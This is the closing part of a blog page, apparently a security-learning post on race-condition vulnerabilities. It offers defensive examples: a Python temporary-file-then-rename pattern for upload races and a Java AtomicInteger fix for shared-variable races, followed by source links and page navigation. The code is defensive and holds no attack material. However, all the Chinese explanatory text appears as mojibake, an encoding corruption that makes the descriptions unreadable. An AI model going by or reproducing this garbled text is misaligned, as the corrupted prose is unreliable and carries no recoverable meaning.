<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">æ¼æ´æè¿°ï¼šæ”»å‡»è€…åœ¨ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œåˆ©ç”¨æ—¶é—´çª—å£æ›¿æ¢æ–‡ä»¶å†…å®¹ã€‚</span><br><span class="line"></span><br><span class="line">é˜²å¾¡æ–¹æ³•ï¼š</span><br><span class="line"></span><br><span class="line">    ä½¿ç”¨ä¸´æ—¶æ–‡ä»¶ï¼Œä¸Šä¼ å®Œæˆåå†é‡å‘½åã€‚</span><br><span class="line"></span><br><span class="line">    ç¤ºä¾‹ï¼š</span><br><span class="line">    python</span><br><span class="line">    å¤åˆ¶</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> tempfile.NamedTemporaryFile(delete=<span class="literal">False</span>) <span class="keyword">as</span> tmp_file:</span><br><span class="line">        tmp_file.write(<span class="string">b&quot;file content&quot;</span>)</span><br><span class="line">        tmp_path = tmp_file.name</span><br><span class="line"></span><br><span class="line">    os.rename(tmp_path, <span class="string">&quot;final_file.txt&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>(3) å¹¶å‘ä¿®æ”¹å…±äº«å˜é‡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">æ¼æ´æè¿°ï¼šå¤šä¸ªçº¿ç¨‹åŒæ—¶ä¿®æ”¹å…±äº«å˜é‡ï¼Œå¯¼è‡´æ•°æ®ä¸ä¸€è‡´ã€‚</span><br><span class="line"></span><br><span class="line">é˜²å¾¡æ–¹æ³•ï¼š</span><br><span class="line"></span><br><span class="line">    ä½¿ç”¨é”æˆ–åŸå­æ“ä½œã€‚</span><br><span class="line"></span><br><span class="line">    ç¤ºä¾‹ï¼ˆJavaï¼‰ï¼š</span><br><span class="line">    java</span><br><span class="line">    å¤åˆ¶</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> java.util.concurrent.atomic.AtomicInteger;</span><br><span class="line"></span><br><span class="line">    <span class="type">AtomicInteger</span> <span class="variable">sharedResource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicInteger</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateResource</span><span class="params">()</span> &#123;</span><br><span class="line">        sharedResource.incrementAndGet();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h6 id="ä¸€äº›ç´ ææ¥æºï¼š"><a href="#ä¸€äº›ç´ ææ¥æºï¼š" class="headerlink" title="ä¸€äº›ç´ ææ¥æºï¼š"></a>ä¸€äº›ç´ ææ¥æºï¼š</h6><p><a target="_blank" rel="noopener" href="https://noa.pages.dev/posts/web_security/race_conditions/">Noahâ€™s Blog</a></p>
<p><a target="_blank" rel="noopener" href="https://chat.deepseek.com/">DeepSeek</a></p>

    </div>
    
    <!-- Post Footer -->
    <footer class="post-footer">
        
            <div class="post-updated">
                <small>Last updated: July 19, 2025</small>
            </div>
        
        
        <!-- Post Navigation -->
        <nav class="post-nav">
            
                <div class="post-nav-item post-nav-prev">
                    <a href="/2025/04/19/Basic-ROP-Learning/" class="post-nav-link">
                        <span class="post-nav-label">â† Previous</span>
                        <span class="post-nav-title">Basic ROP Learning</span>
                    </a>
                </div>
            
            
            
                <div class="post-nav-item post-nav-next">
                    <a href="/2025/02/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwnstack%E9%A2%98%E8%A7%A3/" class="post-nav-link">
                        <span class="post-nav-label">Next â†’</span>
                        <span class="post-nav-title">æ”»é˜²ä¸–ç•Œ-pwnstacké¢˜è§£</span>
                    </a>
                </div>
            
        </nav>
    </footer>
</article>

<!-- Comments Section -->

        </main>

        <!-- Footer -->
        <footer class="footer">
            <div class="footer-content">
                <p>&copy; 2025 zer0ptr. All rights reserved.</p>
                
            </div>
        </footer>
    </div>

    <!-- æŒ‰éœ€åŠ è½½Highlight.js JavaScript -->
    
        <script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
        <script>
            // å»¶è¿ŸåŠ è½½highlight.jsä»¥æé«˜æ€§èƒ½
            function loadHighlight() {
                if (typeof hljs !== 'undefined') {
                    hljs.highlightAll();
                } else {
                    // å¦‚æœhljsè¿˜æœªåŠ è½½ï¼Œç­‰å¾…ä¸€æ®µæ—¶é—´åé‡è¯•
                    setTimeout(loadHighlight, 100);
                }
            }
            
            document.addEventListener('DOMContentLoaded', loadHighlight);
            
            // å¦‚æœDOMå·²ç»åŠ è½½å®Œæˆï¼Œç«‹å³æ‰§è¡Œ
            if (document.readyState !== 'loading') {
                loadHighlight();
            }
        </script>
    
    
    <!-- JavaScript -->
    <script defer src="/js/search.js"></script>
    <script defer src="/js/script.js"></script>
</body>
</html>